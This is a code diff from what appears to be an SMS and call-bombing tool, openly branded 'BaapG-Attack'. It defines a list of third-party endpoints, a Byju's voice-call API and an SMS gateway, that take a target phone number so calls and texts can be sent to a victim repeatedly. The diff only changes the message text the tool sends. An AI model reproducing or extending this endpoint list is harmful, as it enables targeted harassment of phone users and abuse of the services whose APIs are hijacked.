@@ -4,7 +4,7 @@ apidata = {
 
 "ByCall":(f"https://mtnucleus.byjusweb.com/api/acs/voice?phoneNumber={target}&page=free-trial-classes",{},"GET",'''success":true'''),
 
-"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=SendByBaapGAttack",{},"GET",'''000''')
+"Kisan":(f"https://www.customsms.tk/sms.php?num={target}&msg=Send%20By%20BaapG-Attack%20.%20Jai%20Hind%20%F0%9F%87%AE%F0%9F%87%B3",{},"GET",'''000''')
 
 }
 apis = [apidata["Byjus"],apidata["ByCall"],apidata["Kisan"]]
